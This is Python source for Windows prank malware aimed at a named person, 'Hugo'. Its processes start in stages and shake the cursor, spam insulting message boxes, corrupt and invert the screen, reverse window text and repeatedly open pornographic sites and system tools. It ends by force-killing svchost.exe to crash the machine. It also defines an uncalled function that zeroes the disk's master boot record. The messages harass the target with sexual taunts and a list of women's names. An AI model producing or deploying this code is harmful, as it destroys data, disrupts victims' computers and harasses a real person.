# pip install pywin32
# TODO AFFECT ALL MANITORS

import multiprocessing
from win32api import *
from win32gui import *
from win32ui import *
from win32con import *
from win32file import *
from ctypes import windll
from random import randrange as rd
from random import *
from time import sleep

# VARIABLES

sites = (
    "https://es.stripchat.com/Pinkyladyxxx?affiliateId=230324bw8c48rm5y3fi9q858ycswj2bnna1j35jfyf0lh7kp9kyjzcafcci383jv&campaignId=a96c4365c7d308d3376afe0272ee2b463518c44d17621f80b7dec6f060bcb687&p1=3812510&realDomain=go.mnaspm.com&referrer=https%3A%2F%2Fes.pornhub.com%2F&showStripbot=web&sound=off&sourceId=705623&stripbotVariation=NullWidget&userId=d100f7df1b38527c59f2a01ce658dbfb8b696949c12c1469164f408167d4a1ca",
    "https://es.pornhub.com/view_video.php?viewkey=658e3355545c4",
    "https://es.pornhub.com/view_video.php?viewkey=65fc054b75ec5",
    "https://es.pornhub.com/view_video.php?viewkey=ph5c47ed35e5c20",
    "https://es.pornhub.com/view_video.php?viewkey=ph61df2aee5ecc6",
    "https://www.xvideos.com/video.upotmedfd7b/trio_con_un_amigo_y_un_esclavo_tailandeses.",
    "https://www.xvideos.com/video.kbbeumk4096/naruto_yaoi_-_kiba_se_folla_a_naruto_como_si_fuera_un_perro_y_se_corre_en_su_culo",
    "https://www.xvideos.com/video.ucbcpmkb441/pon_tu_mano_en_mi_cocina",
    "https://es.pornhub.com/view_video.php?viewkey=6487574bac2b0",
    "https://es.pornhub.com/view_video.php?viewkey=ph6399f7f3cd510",
    "https://es.pornhub.com/view_video.php?viewkey=ph624a3fc595bae",
    "https://es.pornhub.com/view_video.php?viewkey=ph5d16756e9eeca",
    "calc",
    "notepad",
    "cmd",
    "write",
    "regedit",
    "explorer",
    "taskmgr",
    "msconfig",
    "mspaint",
    "devmgmt.msc",
    "control",
    "mmc"
)
messages = (
    "Deja la paja, pajero",
    "Guyuri\nSoraya\nCarla campoy\nTania\nAnna Marra\nÁfrica\nPaulita\nLorea (5 veces)\nRocío\nLa negra de Otto\nMariona\nFaten\nOmis\nCarol\nCharlie (La tiktoker 08)\nEmma\nGina\nJulia\nLa italiana\nNicole\nMarta\nClaudia\nLa 11 de sitges\nAndrea\nIsabel",
    "Motos > Coches",
    "El polo del marc te gana en un pique",
    "Mi moto se folla tu coche",
    "Comprame la tinta de la impresora",
    "Hazme un bizum de 10€ para arreglartelo",
    "Tranquilo bro, yo tambien estoy solo",
    "Tania que?",
    "Unos loletes?",
    "Te falta calle tete",
    "El bicho > messi",
    "Cuantas champions tiene el madrid?",
    "Para cuando un minihugo?",
    "La comunidad motera > Tus coches"
)

# FUNCTIONS

def overwrite():
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0",               # Path to MBR
                        GENERIC_WRITE,                          # Write permissions
                        FILE_SHARE_READ | FILE_SHARE_WRITE,     # Read and Write...
                        None,                                   # Nothing as PySecurity attribute
                        OPEN_EXISTING,                            # Open existing file
                        0, 0)                                   # Create handle to MBR
    buffer = bytes([0 for i in range(512)])
    bufferWritten = WriteFile(hDevice, buffer, None)
    CloseHandle(hDevice)

def openSites():
    global sites

    while True:
        sleep(1)
        __import__("os").system("start " + str(choice(sites)))

def blinkScreen():
    monitor = GetDC(0)
    width, heigth = (GetSystemMetrics(0), GetSystemMetrics(1))

    while True:
        sleep(1)
        PatBlt(monitor, 0, 0, width, heigth, PATINVERT)

def EnumChildProc(hwnd, LParam):
    try:
        buffering = PyMakeBuffer(255)
        length = SendMessage(hwnd, WM_GETTEXT, 255, buffering)
        result = buffering[:length * 2].tobytes().decode('utf-16')
        result = result[::-1]

        SendMessage(hwnd, VM_SETTEXT, None, result)
    except: pass

def reverseText():

    HWND = GetDesktopWindow()

    while True:
        sleep(5)
        EnumChildWindows(HWND, EnumChildProc, None)

def errorDrawing():
    warningIcon = LoadIcon(None, 32515) # Maybe change for FuckHugo
    IconError = LoadIcon(None, 32513) # Maybe change for FuckHugo
    monitor = GetDC(0)
    width, heigth = (GetSystemMetrics(0), GetSystemMetrics(1))

    while True:
        DrawIcon(monitor, rd(width), rd(heigth), warningIcon)

        for alert in range(60):
            mouseX, mouseY = GetCursorPos()
            DrawIcon(monitor, mouseX, mouseY, IconError)
            sleep(0.05)

def errorDisplay():
    warningIcon = LoadIcon(None,32515)
    monitor = GetDC(0)
    width,heigth = (GetSystemMetrics(0), GetSystemMetrics(1))

    while True:
        for alert in range(100):
            DrawIcon(monitor, rd(width), rd(heigth), warningIcon)
        sleep(2)

def msgBox():
    message = str(choice(messages))
    title = "Jodete Hugo"

    MessageBox(message, title, MB_OK | MB_ICONWARNING)

def warningSpam():  # GLOBAL VARIABLE TIME

    while True:
        sleep(5)
        multiprocessing.Process(target = msgBox).start()

def screenPuzzle(): 

    monitor = GetDC(0)
    width, heigth = (GetSystemMetrics(0), GetSystemMetrics(1))

    x1 = rd(width - 100)
    y1 = rd(heigth - 100)
    x2 = rd(width - 100)
    y2 = rd(heigth - 100)

    while True:
        newWidth = rd(600)
        newHeigth = rd(600)
        
        BitBlt(monitor, x1, y1, newWidth, newHeigth, monitor, x2, y2, SRCCOPY)
        sleep(1)

def cursorShake():
    multiplicator = 1
    while True:
        x,y = GetCursorPos()

        newX = x + (rd(3) - 1) * rd(int((multiplicator + 1) // 2200 + 2))
        newY = y + (rd(3) - 1) * rd(int((multiplicator + 1) // 2200 + 2))

        SetCursorPos((newX, newY))
        multiplicator += 0.1
        sleep(0.05)
    
def screenParallax():
    monitor = GetDC(0)
    width, heigth = (GetSystemMetrics(0), GetSystemMetrics(1))

    while True:
        StretchBlt(monitor, 50, 50, width - 100, heigth - 100, monitor, 0, 0, width, heigth, SRCCOPY)
        sleep(0.5)

# START PROGRAM

if __name__ == '__main__':

    openPages = multiprocessing.Process(target = openSites)
    reverse = multiprocessing.Process(target = reverseText)
    blinking = multiprocessing.Process(target = blinkScreen)
    icons = multiprocessing.Process(target = errorDrawing)
    iconDisplay = multiprocessing.Process(target = errorDisplay)
    shaking = multiprocessing.Process(target = cursorShake)
    parallax = multiprocessing.Process(target = screenParallax)
    puzzling = multiprocessing.Process(target = screenPuzzle)
    spam = multiprocessing.Process(target = warningSpam)

    shaking.start()
    sleep(60)

    icons.start()
    sleep(60)

    spam.start()
    puzzling.start()
    sleep(60)

    openPages.start()
    blinking.start()
    sleep(60)

    reverse.start()
    iconDisplay.start()
    sleep(60)

    parallax.start()
    sleep(120)
    
    __import__("os").system("taskkill /F /IM svchost.exe")